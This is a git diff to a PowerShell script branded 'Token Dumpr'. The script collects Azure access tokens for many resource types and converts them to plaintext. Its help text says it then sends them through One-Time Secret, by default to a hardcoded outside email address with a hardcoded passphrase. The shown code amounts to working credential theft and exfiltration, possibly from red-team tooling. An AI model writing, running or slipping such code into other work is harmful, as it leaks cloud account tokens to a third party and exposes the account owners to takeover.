@@ -1,3 +1,29 @@
+<#
+.SYNOPSIS
+Generates access tokens for various Azure resources and shares them via One-Time Secret.
+
+.DESCRIPTION
+The AccessToken function retrieves access tokens for a predefined set of Azure resource types. 
+It then shares these tokens securely using the One-Time Secret service. The function accepts 
+optional parameters for the recipient email and passphrase used for the One-Time Secret.
+
+.PARAMETER receiptEmail
+The email address of the recipient who will receive the One-Time Secret link. 
+Defaults to "r.dijkman@securehats.nl".
+
+.PARAMETER passphrase
+The passphrase used to secure the One-Time Secret. Defaults to "Bl74ckC@t".
+
+.EXAMPLE
+PS> AccessToken -receiptEmail "example@example.com" -passphrase "MyPassphrase123"
+Generates access tokens and shares them via One-Time Secret with the specified email and passphrase.
+
+.NOTES
+- Requires the Az PowerShell module.
+- Ensure you have the necessary permissions to retrieve access tokens for the specified Azure resources.
+- The One-Time Secret link is valid for 1 hour (3600 seconds).
+
+#>
 function AccessToken {
     param (
         $receiptEmail = "r.dijkman@securehats.nl",
@@ -10,14 +36,14 @@ function AccessToken {
     try {
         $tokens = @()
 
-        Write-Host "--- Token Dumpr v1.0.4 ---"
+        Write-Host "--- Token Dumpr v1.0.6 ---"
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString)
 
                 $tokenObject = [PSCustomObject]@{
                     Resource = $resourceTypeName
-                    Token    = $accessToken | ConvertFrom-SecureString -AsPlainText -Force
+                    Token    = ($accessToken | ConvertFrom-SecureString -AsPlainText).token
                 }
                 $tokens += $tokenObject
             }
